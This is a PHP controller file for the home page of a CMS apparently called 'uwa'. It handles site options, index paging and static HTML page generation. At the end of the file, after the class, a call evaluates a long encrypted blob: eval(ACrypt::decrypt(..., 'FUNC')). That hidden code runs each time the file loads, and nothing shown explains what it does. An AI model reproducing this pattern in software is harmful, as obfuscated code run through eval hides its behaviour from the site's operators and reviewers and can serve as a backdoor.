<?php

/**
 *--------------------------------------
 * home index
 *--------------------------------------
 * @project		: uwa
 * @author		: cblee
 * @created		: 2012-09-28
 * @copyright	: (c)2012 AsThis
 *--------------------------------------
 */
defined('PFA_PATH') or exit('Access Denied');

class IndexCtrlr extends Ctrlr {
	public function __construct() {
		parent::__construct();

		if(!file_exists(CFG_PATH . D_S . 'install.lock.php')) {
			redirect(__APP__ . 'install/');
		}

		$_SITE = M('Option')->get_option('site');
		unset($_SITE['theme']);
		$this->assign('_SITE', $_SITE);

		$_G = M('Option')->get_option();
		unset($_G['site']);
		unset($_G['core']);
		unset($_G['index']);
		unset($_G['image']);
		$this->assign('_G', $_G);

		$timeKey = time();
		$_TK = array('timeKey' => $timeKey, 'token' => substr(md5(SOFT_SEED . $timeKey), 8, 8));
		$this->assign('_TK', $_TK);

		$this->assign('TASK', '');
		$this->assign('_GCAP', GCAP);
	}

	public function index() {
		$_o = M('Option')->get_option('core');
		$_oi = M('Option')->get_option('index');

		$this->assign('_GCAP', 'home@index/index');

		/* allow index paging */
		if($_oi['paging_switch']) {
			/* get paging */
			$_GET[C('VAR.PAGE')] = intval(ARequest::get(C('VAR.PAGE'))) ? intval(ARequest::get(C('VAR.PAGE'))) : 1;

			/* html not support dynamic view */
			if($_o['html_switch'] and $_oi['html_switch'] and $_o['forced_html'] and !is_mobile()) {
				$_dir = '/' . trim(str_replace('{uwa_path}', '', $_oi['html_path_paging']), '/');
				$naming = str_replace('{page}', ARequest::get(C('VAR.PAGE')), $_oi['html_naming_paging']);
				$file = $_dir . '/' . trim($naming, '/') . C('HTML.FILE_SUFFIX');
				$url = __APP__ . ltrim($file, '/');
				redirect($url);
			}

			$where = array();
			$where['__ARCHIVE__.a_status'] = array('EQ', 1);
			$order = '`a_rank` DESC, `a_edit_time` DESC';

			$rowsNum = M('Archive')->get_archiveCount($where);
			$p = new APage($rowsNum, $_oi['page_size'], Url::U('index/index?' . C('VAR.PAGE') . '=_page_'));
			$this->assign('PAGING', $p->get_paging());
			$limit = $p->get_limit();

			/* archive list */
			$_AL = M('Archive')->get_archiveList($where, $order, $limit);
			$this->assign('_L', $_AL);

			/* task */
			$this->assign('TASK', 'build_html_index&' . C('VAR.PAGE') . '=' . ARequest::get(C('VAR.PAGE')));

			if('clip' == ARequest::get('type')) {
				$this->display('home/clip/' . $_oi['tpl_paging']);
			}
			else {
				$this->display('home/' . $_oi['tpl_paging']);
			}
		}
		else {
			/* html not support dynamic view */
			if($_o['html_switch'] and $_oi['html_switch'] and $_o['forced_html'] and !is_mobile()) {
				/* build html */
				$htmlFile = APP_PATH . D_S . $_oi['html_naming'] . C('HTML.FILE_SUFFIX');
				if(!file_exists($htmlFile) or (0 != $_o['html_expire_index'] and time() > filemtime($htmlFile) + $_o['html_expire_index'])) {
					$this->build_html(trim($_oi['html_naming'], '/') . C('HTML.FILE_SUFFIX'), APP_PATH, 'home/'.$_oi['tpl']);
				}

				/* redirect */
				$url = __APP__ . trim($_oi['html_naming'], '/') . C('HTML.FILE_SUFFIX');
				redirect($url);
			}

			/* task */
			$this->assign('TASK', 'build_html_index');
			$this->display('home/' . $_oi['tpl']);
		}
	}
}

eval(ACrypt::decrypt('UikMK1MoA2FTMQQkDSEFbwFsUTBUNlZvWmBbZAAnAH1SKQAAUgMHawhpVysKJwNjVidRPVI2VHdeblJnBG0FDVJjDHlTYQN1UyAEIw0pBSQBYlE2VCdWXlpvW2gAZAAyUmgAblJsByUIJlcqCiYDflZfUVlSXFRlXnJSZgRgBSZSbwxuU2YDJlMzBDUNdQVcAWlROlQwVmRabVtiAGIAf1IvAC1ScgcPCAVXCgoPAyFWPlE6UjZUZl5pUmsEZgUUUm8MbVNtAyZTaQRwDUIFRQFCUQxUA1ZAWldbSQAnAHlSJgBJUlYHUQgvVy0KJgN2VidRMVImVHdedVIgBG4FNlIzDClTewNyUyYEJA1uBW8BalEkVDZWc1orW0AAVAAyUnQAe1JsB3AINVc5CmEDYFYmUQxSMFRtXnFSIAQkBQFSQwxTU14DQ1MGBA8NTwVCAUhRFlR0VihaKlsoACsAd1I2ACFSKQczCDlXKgomAytWclF0UntUYF5iUnoEJAVpUgsMC1MBAw9TPQQ2DSkFIgFjUTpUP1ZkWlxbZAB/AD5SdQB5UnoHKggrV28KbwNmVjdRPVI2VGZeQVJhBG8FN1IvDChTKAN9U1kEWg0IBQoBDFEhVDZWdVp2W3MAaQB3UmgAeFJlB24INFcOCgwDDFZbUS5SWFQJXg5SAQQnBT5SbwxiU20DaFM3BDUNIQU+ASVRJlQ9VnJaZltzAG4ANlJqAGRScwdnCCdXQgpFA3dWK1EjUiFUOV49UmwEZgUxUnQMeFN4A3JTfAQ5DW8FYAFpUSZUN1ZkWiNbKQAjADtSbwBuUmwHbAhsV2YKQANsVj5RNlJ8VC9eJ1JbBEwFFFJSDF5TRgNHUxkEFQ0hBS0BJVEAVBxWR1pXW14ARAAYUkIASFJHB0MIQldGCi8DLFZpUV5SX1QKXg5SYQRlBXpSdQx1U3oDclM7BDwNbgV0AWBRIVR7ViVab1toAGQAMlJoAG5SbAdZCChXZwppA2hWM1E6UjtUJF5aUiEEIwVzUjsMIVN7A3JTJgQkDW4FbwFqUSRUNlZzWitbQABUADJSdAB7UmwHcAg1VzkKYQNgViZRDFIwVG1ecVIgBCQFAVJDDFNTXgNDUwYEDw1PBUIBSFEWVHRWKFoqWygAJwAsUgsAB1IABwsIBldxCmMDcVYnUSFSO1QjXmlSfQRvBT5SPQwMUwIDD1NdBC0NDAUJAQxRWlQhVmRad1t0AHUAOVImAClSZQdrCGxXZgpoA2ZWN1FoUlhUCV4OUnUEDgVYUns=', 'FUNC'));
?>